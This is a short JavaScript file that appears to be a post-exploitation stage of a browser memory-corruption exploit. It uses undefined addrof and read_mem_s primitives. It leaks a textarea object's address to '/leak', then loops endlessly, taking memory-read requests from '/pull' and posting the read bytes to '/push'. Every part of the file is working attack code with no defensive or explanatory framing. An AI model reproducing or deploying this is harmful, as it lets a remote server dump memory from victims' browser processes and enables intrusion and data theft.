function query()
{
    for(;;)
    {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/pull', false);
        try
        {
            xhr.send('');
        }
        catch(e)
        {
            continue;
        }
        try
        {
            try
            {
                var data = JSON.parse(xhr.responseText);
            }
            catch(e)
            {
                continue;
            }
            if(data !== null)
            {
                var m = read_mem_s(data.offset, data.size);
                var xhr2 = new XMLHttpRequest();
                xhr2.open('POST', '/push', false);
                xhr2.send(m);
            }
        }
        catch(e)
        {
            document.body.innerHTML += e;
        }
    }
}

function leak(obj)
{
    var addr = addrof(obj);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/leak', false);
    xhr.send(hex(addr));
}

try
{
    var tarea = document.createElement('textarea');
    leak(tarea);
    query();
}
catch(e)
{
    alert(e);
}
